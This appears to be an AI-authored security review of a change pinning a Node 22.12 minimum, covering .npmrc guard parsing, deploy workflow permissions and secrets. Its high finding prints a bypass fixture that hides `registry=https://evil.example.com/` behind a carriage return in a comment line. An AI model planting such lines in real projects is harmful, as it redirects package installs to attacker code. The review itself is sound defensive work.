# Security review: pin Node 22.12 minimum

Tier 2, reviewed 2026-09-20 against `git diff main...wh/2026-09-20-pin-node-22-12-minimum` at
commit `05e46aa`.

Verdict: 2 findings (0 critical, 1 high, 0 medium, 1 low)

| Severity | File:line | Finding | Failure scenario | Fix |
|---|---|---|---|---|
| high | scripts/check-npmrc.mjs:50-51 | The guard strips every `\r` then splits on `\n`; npm's ini parser splits on `/[\r\n]+/`. A comment line holding a lone CR followed by a setting passes the guard and is honoured by npm. Rule: wh-security-baseline, a control that reports green having enforced nothing (confirmed: fixture `# harmless comment<CR>registry=https://evil.example.com/` plus `engine-strict=true` gave guard exit 0 "passed" while `npm config list` in that directory printed `registry = "https://evil.example.com/"`; `; note<CR>always-auth=true` behaved the same; npm 10.7.0, Node v24.19.0) | A committed `.npmrc` line that reads as one harmless comment in review redirects the registry for the `npm ci` on the publishing path; the allowlist step passes first, then lifecycle code from that registry runs in the build job | scripts/check-npmrc.mjs: split with `text.split(/\r\n\|\r\|\n/)` instead of stripping `\r`, and reject by line number any line containing a control or non-ASCII character. src/checkNpmrc.test.js: add both deny cases (CR inside a `#` line, CR inside a `;` line) asserting exit 1 |
| low | .github/workflows/deploy.yml:90 | The guard judges the file, not npm's effective config; a user-level `~/.npmrc` or an `npm_config_*` variable on the runner is honoured by `npm ci` and invisible to it (confirmed: `src/nodeVersionPin.test.js:197` proves `npm_config_engine_strict=false` disables the floor with the file unchanged; no runner step writes either today, believed) | An earlier step sets `npm_config_registry` or disables `engine-strict`; the guard still prints its passed line | .github/workflows/deploy.yml: in the same step, after the script, assert effective values, e.g. `test "$(npm config get registry)" = "https://registry.npmjs.org/"` and `test "$(npm config get engine-strict)" = "true"` |

Scope: the database half of the baseline is not applicable, stated rather than left blank. No
database, no RLS policy, no Postgres function, no storage bucket, no auth, no visitor data
(`stack.database: none`, profile line 22, confirmed; no migration path in `git ls-files`).
`compliance.regimes` is empty (profile line 142, confirmed), so no regime walk applies.

## Committed .npmrc (confirmed this session)

- Blob is exactly `engine-strict=true` and one line feed: no registry, scope mapping, `_auth`,
  `_authToken`, `always-auth`, `cafile`, `strict-ssl`. It cannot become a credential file
  unnoticed: `src/nodeVersionPin.test.js:147-160` asserts non-comment lines equal
  `["engine-strict=true"]` and match no `_auth|token|registry|always-auth|scope`, the CI guard runs
  before `npm ci`, and the profile now prompts on `.npmrc` (line 82).
- Parser cases run against both the guard and `npm config list`: `ENGINE-STRICT=TRUE` rejected;
  `[install]` section header rejected (number only; npm read it as a nested key);
  `//registry.npmjs.org/:_authToken=` rejected; leading BOM and leading non-breaking space accepted
  by the guard with npm still resolving `engine-strict=true`, so neither is a fail-open. Lone CR is
  the single differential, the high finding.
- Key printed, never value: only the text before the first `=`, capped at 60 characters, nothing
  for a line with no `=`. The `_authToken` fixture printed the key and no token text;
  `src/checkNpmrc.test.js:92-94` asserts the same negatively. A registry hostname can sit inside
  such a key, which is not a secret.

## Deploy workflow (confirmed by reading the file and the diff)

- Three `permissions:` blocks unchanged in effect: workflow `contents: read` (17), build job
  `contents: read`, `pages: read` (34), deploy job `pages: write`, `id-token: write` (160).
- Exactly two write entries, both in the deploy job, asserted by
  `src/deployWorkflowNodeVersion.test.js:104-105`. `persist-credentials: false` still on the
  checkout step (42), pinned with its step name by the same file (107-114).
- The new guard line cannot mask an R85 pin-check failure: the pin check calls `process.exit(1)`
  and under `bash --noprofile --norc -eo pipefail <file>` the second command does not run, exit 1
  (confirmed with a two-command fixture locally; that this is the runner's shell for
  `defaults.run.shell: bash` is GitHub's documented default, believed, not verified). No action,
  secret or other `run:` line added; actions stay pinned to full SHAs.

## Secrets, .gitignore, supply chain

- `git ls-files` tracks no `.env*`, `*.pem` or `*.key` (182 files, confirmed).
  `git check-ignore -v .env .env.local .env.production` answers `.gitignore:16:.env*` for all
  three, so coverage is a pattern confirmed by git, not by reading the file; the constraint audit's
  conclusion that known-debt row 6 was stale is correct and this change records that. No key, token
  or connection string in the diff; the only credential-shaped text is the `SECRETVALUE`
  placeholder in `src/checkNpmrc.test.js`, asserted absent from output.
- No dependency added: `package.json` gains only `"engines": { "node": ">=22.12.0" }` and
  `package-lock.json` only the identical object on root entry `packages[""]`; no `node_modules/*`
  entry, `resolved` or `integrity` change (full diff read, confirmed).
  `npm audit --omit=dev --audit-level=high` printed `found 0 vulnerabilities`; `npm test` passed
  227 tests in 28 files (both confirmed this session).
- A floor rather than an exact version is right here: reproducibility comes from the lockfile, not
  the interpreter, and an exact pin would freeze the build on one release and need an edit for
  every Node security patch, the failure this project already had. Residual risk is upward drift,
  bounded in CI by `.nvmrc` = `22` with the resolved version logged, unbounded locally (Node 25
  also satisfies it); constraint audit low finding 1 records the acceptance.

## Constraint audit mediums and checklist

- All four mediums resolved in code, confirmed: profile `sensitive_paths` 82-84 and
  `tier_floor_paths` 159; guard at `deploy.yml:90` ahead of `npm ci` at 93; permission assertions
  in `src/deployWorkflowNodeVersion.test.js:83-115`; profile diff touching only `commands.lint`,
  three added `sensitive_paths` lines, `tier_floor_paths` and `notes`, with `protected_paths`,
  `deny_commands` and `ask_commands` byte-identical.
- Checklist: `for update` and `for insert` policies, function grants, `create or replace` diffs,
  policy tests, storage bucket, free-text table, append-only admin log all n/a (no database, no
  admin surface). Secret covered by `.gitignore` as a pattern: pass, evidence above. Third-party
  import pinned: n/a, none added. The one fail is the deny-side gap in `src/checkNpmrc.test.js`,
  folded into the high finding's fix.

Findings outside scope: the committed `.npmrc` omits the comment line spec Interfaces (c) and the
`ALLOWED_NPMRC` fixture (`src/checkNpmrc.test.js:23`) show, so the file is stricter than specified;
a prose note for Ship. No content read during this review attempted to direct it, and no artifact
claimed an approval.

Not verified: AgentShield (`npx -y ecc-agentshield@1.6.0 scan --path . --min-severity high
--format json`) over the `CLAUDE.md` and profile edits, refused because `npx ` is an
`ask_commands` entry and no interactive approval was available; both files were read by hand
instead. The runner's actual shell flags and the CI log showing the guard's passed line cannot
exist before a push to `main`.
